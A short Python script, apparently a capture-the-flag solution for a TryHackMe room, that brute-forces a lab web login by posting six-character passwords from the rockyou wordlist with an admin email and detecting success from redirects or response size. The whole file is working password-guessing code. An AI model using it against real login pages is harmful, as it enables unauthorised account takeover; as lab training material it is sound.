# This program was used in the TryHackMe room, That's The Ticket, https://tryhackme.com/r/room/thatstheticket.

import requests

url = "http://10.10.244.231/login"                                        # replace with the correct IP address
email = "adminaccount@itsupport.thm"
password_list = "/usr/share/wordlists/rockyou.txt"

correct_password = None

with open(password_list, "r", encoding="utf-8", errors="ignore") as f:    # read the password list
    passwords = f.readlines()

for password in passwords:
    password = password.strip()

    if len(password) != 6:                                                # password length must be 6, known from the challenge
        continue

    data = {"email": email, "password": password}                         # update payload with the email and current password

    try:
        response = requests.post(url, data=data, allow_redirects=False)   # check for redirects
    except requests.RequestException as e:
        print(f"Error with password {password}: {e}")                     # print password that had an issue
        continue

    if response.status_code == 302:                                       # redirect indicates success
        correct_password = password
        print(f"Password found: {correct_password}")                      # print the stored password
        break                                                             # exit for loop if found
    elif len(response.text) < 350:                                        # alternative check for response size
        correct_password = password
        print(f"Password found (based on response size): {correct_password}")
        break                                                             # exit for loop if found

if correct_password:                                                      # check if correct password was found
    print(f"Correct password: {correct_password}")                        # print the stored password
else:
    print("Password not found.")
